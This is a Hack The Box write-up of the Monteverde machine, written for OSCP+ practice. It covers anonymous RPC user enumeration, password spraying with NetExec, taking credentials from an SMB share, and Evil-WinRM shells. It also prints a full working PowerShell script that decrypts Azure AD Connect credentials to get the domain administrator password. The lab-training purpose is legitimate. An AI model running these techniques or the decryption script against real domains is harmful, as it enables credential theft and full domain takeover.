---
layout: post
title:  HTB Monteverde Write-up
description: Part of the OSCP+ Preparation Active Directory Series
date:   2024-11-03 01:00:00 +0300
image:  '/images/htb_monteverde.png'
tags:   [Write-ups, HTB, OSCP+, Weak-Credentials, RPC-Enumeration, SMB-Shares, Azure-AD-Connect]
---
# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [RPC uncredentialed User Enumeration](#rpc-uncredentialed-user-enumeration)
  - [Password Spraying with NetExec using Username as Password](#password-spraying-with-netexec-using-username-as-password)
  - [SMB Access as SABatchJobs using impacket-smbclient](#smb-access-as-sabatchjobs-using-impacket-smbclient)
- [Foothold](#foothold)
  - [Testing Credentials using NetExec leading to valid WinRM Credentials](#testing-credentials-using-netexec-leading-to-valid-winrm-credentials)
  - [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
  - [Enumerating User mhope to find out its in Azure Admins group](#enumerating-user-mhope-to-find-out-its-in-azure-admins-group)
  - [Azure AD Connect Exploitation to obtain Administrator Credentials](#azure-ad-connect-exploitation-to-obtain-administrator-credentials)
  - [Using Evil-WinRM to Access as Administrator](#using-evil-winrm-to-access-as-administrator)
  - [Root Flag](#root-flag)

# Enumeration
## Nmap
```shell
nmap -A -Pn -T4 -p- 10.129.228.111
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 20:44 EDT
Nmap scan report for 10.129.228.111
Host is up (0.033s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-03 00:46:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-03T00:47:43
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   33.29 ms 10.10.14.1
2   33.37 ms 10.129.228.111

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 205.44 seconds
```
## RPC Uncredentialed User Enumeration
After testing uncredentialed access on SMB and RPC, we found out that we can access and enumerate users connecting with RPC without credentials:
```shell
rpcclient -U "" -N 10.129.228.111
```
We can use the command "enumdomusers" to get a list of all users:
```shell
rpcclient $> enumdomusers
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```
Or "querydispinfo" to get more detailed information about each user:
```shell
rpcclient $> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)
```
## Password Spraying with NetExec using Username as Password
When dealing with credentials, it's always important to test if a user is using its username as password. In this case, we can create a custom list containing the names of the users:
```shell
cat usernames.txt

Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```
And then use the list usernames.txt to carry out a password spraying attack using NetExec:
```shell
nxc smb 10.129.228.111 -u usernames.txt -p usernames.txt --continue-on-success
```

```shell
<SNIP>
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\svc-ata:SABatchJobs STATUS_LOGON_FAILURE 
<SNIP>
```
If we examine the NetExec results, we will see that we got valid credentials:
```shell
SABatchJobs:SABatchJobs
```
## SMB Access as SABatchJobs using impacket-smbclient
We will use the credentials of SABatchJobs and impacket-smbclient to get SMB access:
```shell
impacket-smbclient 'SABatchJobs':'SABatchJobs'@10.129.228.111
```
And display the SMB shares with the "shares" command:
```shell
# shares
ADMIN$
azure_uploads
C$
E$
IPC$
NETLOGON
SYSVOL
users$
```
After some manual enumeration, we found a file called "azure.xml" containing a password. We can use the "mget" command to get it:
```shell
# use users$
# ls
drw-rw-rw-          0  Fri Jan  3 08:12:48 2020 .
drw-rw-rw-          0  Fri Jan  3 08:12:48 2020 ..
drw-rw-rw-          0  Fri Jan  3 08:15:23 2020 dgalanos
drw-rw-rw-          0  Fri Jan  3 08:41:18 2020 mhope
drw-rw-rw-          0  Fri Jan  3 08:14:56 2020 roleary
drw-rw-rw-          0  Fri Jan  3 08:14:28 2020 smorgan
# cd mhope
# ls
drw-rw-rw-          0  Fri Jan  3 08:41:18 2020 .
drw-rw-rw-          0  Fri Jan  3 08:41:18 2020 ..
-rw-rw-rw-       1212  Fri Jan  3 09:59:24 2020 azure.xml
# mget azure.xml
[*] Downloading azure.xml
```
The azure.xml file contains the following:
```shell
cat azure.xml

��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```
Since we found azure.xml in the folder of the user mhope, we can suppose that this is the password for that user, giving us the following credentials:
```shell
mhope:4n0therD4y@n0th3r$
```

But... where can we use that password?
# Foothold
## Testing Credentials using NetExec leading to Valid WinRM Credentials
We used the following NetExec commands to test the credentials on SMB and WinRM:
```shell
nxc smb 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$' --continue-on-success
nxc winrm 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$' --continue-on-success
```
Using impacket-psexec won't give us a shell, since the shares are not writeable. But using Evil-WinRM we can get shell access, thanks to the credentials being valid for WinRM:
```shell
evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r$'
```
The above evil-winrm command successfully granted us shell access as the user mhope.

## User Flag
Now we can get the user.txt flag:
```shell
type C:\Users\mhope\Desktop\user.txt
```
# Privilege Escalation
## Enumerating User mhope to find out its in Azure Admins group
We enumerated the user mhope using the following command:
```shell
whoami /all
```

```shell
USER INFORMATION
----------------

User Name      SID
============== ============================================
megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
After examining the results, we can see that mhope is part of the group Azure Admins.

## Azure AD Connect Exploitation to obtain Administrator Credentials

Through manual system and folders enumeration, we found traces of Azure AD everywhere. 

Notably, the Microsoft Azure Active Directory Connect service is of particular interest, as it synchronizes the entire Active Directory along with password hashes. This indicates that the service possesses DCSync privileges within the domain.

Doing some research, we found the following documentation about how to exploit Azure AD Connect:
https://blog.xpnsec.com/azuread-connect-for-redteam/

This documentation says that the members of Azure Admins group have read rights on the database ADSync in the MSSQL, which contains the encrypted configuration being used for the Microsoft Azure Active Directory Connect service.

The documentation also contains a PoC script, which requires SQL server with remote connections enabled, but that is not the case here. This means we will need to edit the script.

The edited script looks as follow:

```shell
Write-Host "Retrieving Key_ID, Instance_ID, and Entropy..."
   
$basic_data = (Invoke-SQLCmd "USE ADSync; SELECT keyset_id, instance_id, entropy FROM mms_server_configuration")
   
$key_id = $basic_data.keyset_id
$instance_id = new-object System.Guid($basic_data.instance_id)
$entropy = new-object System.Guid($basic_data.entropy)
   
Write-Host "Collecting Private and Encrypted Configuration..."
$advanced_data = (Invoke-SQLCmd "USE ADSync; SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'")
   
$config = $advanced_data.private_configuration_xml
$crypted = $advanced_data.encrypted_configuration
   
Write-Host "Loading mcrypt.dll and Decrypting the Credentials..."
add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
   
$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
   
Write-Host "Recovered Azure ADSync Credentials Successfully"
   
Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

We can open our text editor on Kali, create a file called "AzureADDecryptMSOL.ps1" and put the script above inside:
```shell
sudo gedit AzureADDecryptMSOL.ps1
```
Then we can easily move the script using evil-winrm "upload" command:
```shell
*Evil-WinRM* PS C:\Users\mhope\Desktop> upload AzureADDecryptMSOL.ps1
```
And finally run the script:
```shell
*Evil-WinRM* PS C:\Users\mhope\Desktop> ./AzureADDecryptMSOL.ps1
Retrieving Key_ID, Instance_ID, and Entropy...
Collecting Private and Encrypted Configuration...
Loading mcrypt.dll and Decrypting the Credentials...
Recovered Azure ADSync Credentials Successfully
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```
It worked! We got the following credentials:
```shell
administrator:d0m@in4dminyeah!
```
## Using Evil-WinRM to Access as Administrator
Now we can use these credentials to get access as Administrator and get the root.txt flag:
```shell
evil-winrm -i 10.129.228.111 -u Administrator -p 'd0m@in4dminyeah!'
```
## Root Flag
```shell
type C:\Users\Administrator\Desktop\root.txt
```